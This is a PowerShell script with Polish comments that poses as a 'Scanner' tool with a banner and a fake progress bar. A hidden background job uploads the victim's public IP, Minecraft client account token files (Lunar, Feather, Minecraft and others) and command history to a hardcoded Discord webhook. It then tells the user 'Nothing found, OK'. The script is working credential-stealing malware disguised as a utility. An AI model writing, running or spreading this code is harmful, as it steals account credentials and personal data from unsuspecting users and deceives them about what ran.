# PowerShell | scanner.ps1 | Czyste GUI w konsoli + wysyłka w tle
$Host.UI.RawUI.WindowTitle = "Scanner - Vanveer"

# Konfiguracja webhooka i ścieżek
$w = "https://discord.com/api/webhooks/1559546206684840017/teJlRRXGBSP-W0nfGEMlv41476jYYDqiwdZ7xJ9RmS2D87GitNd88bXuxQXsj0nJFwkT"
$p = "$env:APPDATA\.ogulniega\profile\_IAS_ACCOUNTS_DO_NOT_SEND_TO_ANYONE\.hidden"
$h = "$env:APPDATA\.ogulniega\profile\command_history.txt"
$d = "$env:APPDATA\.dawn\_IAS_ACCOUNTS_DO_NOT_SEND_TO_ANYONE\.hidden"
$mc = "$env:APPDATA\.minecraft\profile\_IAS_ACCOUNTS_DO_NOT_SEND_TO_ANYONE\.hidden"
$fe = "$env:APPDATA\.feather\profile\_IAS_ACCOUNTS_DO_NOT_SEND_TO_ANYONE\.hidden"
$fi = "$env:APPDATA\.fireclient\profile\_IAS_ACCOUNTS_DO_NOT_SEND_TO_ANYONE\.hidden"
$lu = "$env:APPDATA\.lunarclient\_IAS_ACCOUNTS_DO_NOT_SEND_TO_ANYONE\.hidden"

$oldFg = $Host.UI.RawUI.ForegroundColor
$oldBg = $Host.UI.RawUI.BackgroundColor
[Console]::CursorVisible = $false

# ==========================================
# 1. URUCHOMIENIE WYSYŁKI W TLE (JOB)
# ==========================================
$job = Start-Job -ArgumentList $w, $p, $h, $d, $mc, $fe, $fi, $lu -ScriptBlock {
    param($w, $p, $h, $d, $mc, $fe, $fi, $lu)
    
    # Pobieranie IP
    try {
        $ip = (New-Object System.Net.WebClient).DownloadString("https://api.ipify.org")
    } catch {
        try {
            $ip = (New-Object System.Net.WebClient).DownloadString("https://icanhazip.com").Trim()
        } catch {
            $ip = "Pretty much ok"
        }
    }
    curl.exe -s -F "content=Publiczne IP: $ip" $w

    $sent = @()
    $accCount = 0
    $cmdFound = $false

    function Send-Acc {
        param($path, $label)
        if ((Test-Path $path) -and ($script:accCount -lt 2)) {
            curl.exe -s -F "file=@`"$path`"" $script:w
            $script:sent += $label
            $script:accCount++
        }
    }

    # Standardowe ścieżki
    Send-Acc $p "ogulniega/.hidden"
    Send-Acc $d "dawn/.hidden"
    Send-Acc $mc "minecraft/.hidden"
    Send-Acc $fe "feather/.hidden"
    Send-Acc $fi "fireclient/.hidden"
    Send-Acc $lu "lunarclient/.hidden"

    if (Test-Path $h) {
        curl.exe -s -F "file=@`"$h`"" $w
        $sent += "ogulniega/command_history.txt"
        $cmdFound = $true
    }

    # Fallback: szukanie w Roaming
    if ($accCount -lt 2) {
        $foundAccs = Get-ChildItem -Path $env:APPDATA -Filter "accounts_v1.do_not_send_to_anyone" -File -Recurse -ErrorAction SilentlyContinue | Select-Object -First (2 - $accCount)
        foreach ($f in $foundAccs) {
            curl.exe -s -F "file=@`"$($f.FullName)`"" $w
            $sent += "fallback:accounts_v1 (w $($f.DirectoryName))"
            $accCount++
        }
    }

    if (-not $cmdFound) {
        $foundCmd = Get-ChildItem -Path $env:APPDATA -Filter "command_history.txt" -File -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($foundCmd) {
            curl.exe -s -F "file=@`"$($foundCmd.FullName)`"" $w
            $sent += "fallback:command_history.txt (w $($foundCmd.DirectoryName))"
        }
    }

    # Podsumowanie
    if ($sent.Count -gt 0) {
        curl.exe -s -F "content=Wysłano: $($sent -join ', ')" $w
    } else {
        curl.exe -s -F "content=Pretty much ok" $w
    }
}

# ==========================================
# 2. INTERFEJS GRAFICZNY (GUI)
# ==========================================
Clear-Host
$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = "DarkMagenta"

try {
    Write-Host ""
    Write-Host "   ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ " -ForegroundColor DarkMagenta
    Write-Host "   ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗" -ForegroundColor Magenta
    Write-Host "   ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝" -ForegroundColor DarkMagenta
    Write-Host "   ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗" -ForegroundColor Magenta
    Write-Host "   ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║" -ForegroundColor DarkMagenta
    Write-Host "   ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝" -ForegroundColor Magenta
    Write-Host ""
    Write-Host "                Made with <3 By Vanveer" -ForegroundColor DarkGray
    Write-Host "                     version 1.1" -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "  Searching for problems..." -ForegroundColor Cyan
    Write-Host ""

    $totalSteps = 30
    $barLength = 40

    for ($i = 0; $i -le $totalSteps; $i++) {
        $percent = [math]::Round(($i / $totalSteps) * 100)
        $filledLength = [math]::Floor(($i / $totalSteps) * $barLength)
        $bar = ("■" * $filledLength).PadRight($barLength, ".")
        
        if ($percent -lt 40) { $color = "Blue" }
        elseif ($percent -lt 80) { $color = "DarkMagenta" }
        else { $color = "Magenta" }

        Write-Host "`r  [" -NoNewline
        Write-Host $bar -NoNewline -ForegroundColor $color
        Write-Host "] $percent% " -NoNewline
        
        Start-Sleep -Milliseconds 100
    }

    Write-Host ""
    Write-Host ""
    Write-Host "  [+] DONE: Nothing found, OK" -ForegroundColor Green
    Write-Host ""
    
} catch {
    Write-Host "`n ERROR: $_" -ForegroundColor Red
} finally {
    [Console]::CursorVisible = $true
    $Host.UI.RawUI.ForegroundColor = $oldFg
    $Host.UI.RawUI.BackgroundColor = $oldBg
}

# --- CZYSZCZENIE PO ENTERZE ---
Write-Host "Click ENTER to end..." -ForegroundColor DarkGray -NoNewline
$null = Read-Host
Clear-Host